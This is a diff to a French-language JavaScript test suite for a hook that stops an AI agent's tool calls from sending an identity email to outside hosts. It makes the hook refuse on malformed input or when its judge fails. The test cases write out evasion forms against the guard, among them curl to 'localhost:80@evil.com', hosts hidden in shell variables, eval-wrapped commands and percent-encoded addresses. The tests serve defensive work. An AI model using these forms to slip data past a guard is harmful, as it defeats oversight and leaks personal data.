@@ -12,9 +12,11 @@ import { spawnSync } from "node:child_process";
 import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import { fileURLToPath } from "node:url";
+import { fileURLToPath, pathToFileURL } from "node:url";
 
 const HOOK = join(dirname(fileURLToPath(import.meta.url)), "hook-identite-sortante.mjs");
+/** Le juge appelé directement, pour les formes de D-194 (b) : un processus par cas coûte plusieurs secondes sur ce poste. */
+const JUGE = await import(pathToFileURL(HOOK).href);
 let pass = 0, fail = 0;
 const check = (nom, fn) => { try { fn(); console.log(`  [PASS] ${nom}`); pass++; } catch (e) { console.error(`  [FAIL] ${nom} — ${e.message}`); fail++; } };
 
@@ -89,10 +91,64 @@ check("vert — la demande consignée par FORGE_IDENTITE_GO laisse passer ; sans
   if (r.code !== 0) throw new Error(`exit ${r.code} — ${r.out}`);
   if (jouer(bash(CAS_DU_14)).code !== 2) throw new Error("sans la variable, l'appel n'est plus refusé");
 });
-check("vert — un outil qui n'émet pas de requête (Read) n'est pas jugé ; une entrée illisible ne bloque pas", () => {
+check("vert — un outil qui n'émet pas de requête (Read) n'est pas jugé", () => {
   if (jouer({ tool_name: "Read", tool_input: { file_path: MOI } }).code !== 0) throw new Error("Read jugé");
-  const r = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: "pas du json", env: ENV });
-  if (r.status !== 0) throw new Error(`entrée illisible : exit ${r.status}`);
+});
+// D-194 (b) du 10/11/2026 : l'entrée illisible ne passe plus. Ce cas disait « une entrée illisible ne bloque pas » : la décision
+// inverse l'attendu, elle ne l'assouplit pas.
+check("rouge (D-194) — une entrée JSON malformée est refusée sans planter : exit 2, motif, aucune pile d'erreur", () => {
+  for (const brut of ["pas du json", "", "[1, 2]", "{\"tool_name\": \"Bash\", "]) {
+    const r = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: brut, env: ENV });
+    if (r.status !== 2 || !/ENTRÉE ILLISIBLE, REQUÊTE REFUSÉE \(R-62, D-194 \(b\)\)/.test(r.stderr) || /at .*\.mjs:\d+/.test(r.stderr)) throw new Error(`${JSON.stringify(brut)} : exit ${r.status} : ${r.stderr.slice(0, 200)}`);
+  }
+});
+// La panne se prouve sur une requête NEUTRE, qui passe quand le juge répond : seul le juge en panne peut la faire refuser.
+const NEUTRE = `curl -s -H "User-Agent: digit-ai-factory" "${API}"`;
+check("rouge (D-194) — panne du juge : une requête neutre est REFUSÉE (exit 2) ; avant, « une panne du juge ne bloque jamais un outil »", () => {
+  const r = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(bash(NEUTRE)), env: { ...ENV, FORGE_GARDE_PANNE_ESSAI: "1" } });
+  if (r.status !== 2 || !/GARDE EN PANNE, REQUÊTE REFUSÉE \(R-62, D-194 \(b\)\)/.test(r.stderr)) throw new Error(`exit ${r.status} : ${r.stderr.slice(0, 200)}`);
+  const sansPanne = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(bash(NEUTRE)), env: ENV });
+  if (sansPanne.status !== 0) throw new Error(`la requête neutre est refusée sans panne : exit ${sansPanne.status}`);
+});
+check("vert (D-194) — le réglage humain FORGE_GARDE_ILLISIBLE=laisse rétablit l'ancien comportement : entrée malformée et panne passent", () => {
+  const env = { ...ENV, FORGE_GARDE_ILLISIBLE: "laisse" };
+  const m = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: "pas du json", env });
+  const p = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(bash(NEUTRE)), env: { ...env, FORGE_GARDE_PANNE_ESSAI: "1" } });
+  if (m.status !== 0 || p.status !== 0) throw new Error(`malformée exit ${m.status}, panne exit ${p.status}`);
+});
+
+// D-194 (b) : les formes de la revue du 10/11 (juger() rejoué avec FORGE_IDENTITES posée rendait « laisse »). Appel direct du juge.
+const direct = (entree, env = ENV) => JUGE.juger(entree, env);
+const refuseI = async (entree, motif = /R-62/) => { const r = await direct(entree); if (r?.decision !== "refuse" || !motif.test(r.motif)) throw new Error(`laissé passer : ${JSON.stringify(r).slice(0, 220)}`); };
+const passeI = async (entree, env = ENV) => { const r = await direct(entree, env); if (r?.decision !== "laisse") throw new Error(`refusé : ${String(r?.motif).slice(0, 220)}`); };
+const ps = (command) => ({ tool_name: "PowerShell", cwd: T, tool_input: { command } });
+const FORMES_194 = [
+  [bash(`curl -A ${MOI} "http://localhost:80@evil.com/x"`), "l'hôte réel est après le dernier @ : localhost:80@evil.com vise evil.com"],
+  [bash(`U=https://api.tiers.io; curl -A "bot ${MOI}" $U`), "l'adresse distante dans une variable de la commande (découpe sur « ; »)"],
+  [bash(`curl -A "bot ${MOI}" api.tiers.io/x`), "une URL sans schéma, que curl envoie en http"],
+  [bash(`curl -A "bot ${MOI}" ftp://api.tiers.io/x`), "le schéma ftp://"],
+  [bash(`curl "https://api.tiers.io/x?contact=${MOI.replace("@", "%40")}"`), "l'adresse encodée (%40)"],
+  [ps(`$h=@{"User-Agent"="${MOI}"}; Invoke-RestMethod -Uri https://api.tiers.io/x -Headers $h`), "l'en-tête dans une table PowerShell en variable"],
+];
+for (const [entree, nom] of FORMES_194) await (async () => { try { await refuseI(entree); console.log(`  [PASS] rouge (D-194) — ${nom} : refusé`); pass++; } catch (e) { console.error(`  [FAIL] rouge (D-194) — ${nom} — ${e.message}`); fail++; } })();
+const checkA = async (nom, fn) => { try { await fn(); console.log(`  [PASS] ${nom}`); pass++; } catch (e) { console.error(`  [FAIL] ${nom} — ${e.message}`); fail++; } };
+await checkA("rouge (D-194) — règle de famille : l'hôte ne se lit pas (variable inconnue), ou la commande est illisible et porte l'adresse", async () => {
+  await refuseI(bash(`curl -A "bot ${MOI}" $U`), /hôte que la garde ne sait pas lire/);
+  await refuseI(bash(`C='curl -A ${MOI} https://api.tiers.io/x'; eval "$C"`));
+  await refuseI(bash(`git -c user.email=${MOI} commit -m "l'essai`), /D-194 \(b\)[^]*guillemets non équilibrés/);
+  await refuseI({ tool_name: "WebFetch", cwd: T, tool_input: { url: `http://localhost:80@evil.com/x?c=${MOI}`, prompt: "x" } });
+});
+await checkA("vert (D-194) — lus et locaux, ou sans adresse : variable locale résolue, hôte local avec From, en-tête neutre, sortie vers un fichier", async () => {
+  await passeI(bash(`U=http://localhost:3000; curl -A "${MOI}" $U`));
+  await passeI(bash(`curl -s http://127.0.0.1:3000/x -H "From: ${MOI}"`));
+  await passeI(bash(`curl -s -o out.json http://localhost:3000/x -A "${MOI}"`));
+  await passeI(bash(`curl -s -H "User-Agent: digit-ai-factory" "${API}"`));
+  await passeI(bash(`echo ${MOI} > note.txt`));
+});
+await checkA("vert (D-194) — le réglage humain FORGE_GARDE_ILLISIBLE=laisse lève la règle de famille ; une requête lisible vers un tiers reste refusée", async () => {
+  await passeI(bash(`git -c user.email=${MOI} commit -m "l'essai`), { ...ENV, FORGE_GARDE_ILLISIBLE: "laisse" });
+  const r = await direct(bash(CAS_DU_14), { ...ENV, FORGE_GARDE_ILLISIBLE: "laisse" });
+  if (r.decision !== "refuse") throw new Error("le réglage a levé R-62 elle-même");
 });
 
 // TF-1978 (20/10/2026) : seule la requête est jugée, pas le reste de la commande.
